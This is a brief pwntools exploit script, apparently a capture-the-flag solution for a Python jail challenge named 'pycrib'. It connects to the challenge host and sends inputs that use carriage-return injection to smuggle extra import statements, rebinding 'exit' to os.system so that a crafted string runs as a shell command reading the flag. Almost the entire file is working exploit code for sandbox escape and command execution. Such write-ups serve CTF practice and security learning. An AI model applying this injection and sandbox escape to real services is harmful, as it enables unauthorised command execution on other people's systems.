from pwn import *
import os

#conn = process(["python3", "./main.py"])
conn = remote("pycrib.ictf.kctf.cloud", 1337)

conn.sendline(b"from main import inp as b\rfrom os import system as exit") # we can pass an arb string to system()
conn.sendline(b"cat or flag if not input else input\rfrom keyword import iskeyword as exit") # iskeyword() does nothing
conn.interactive()
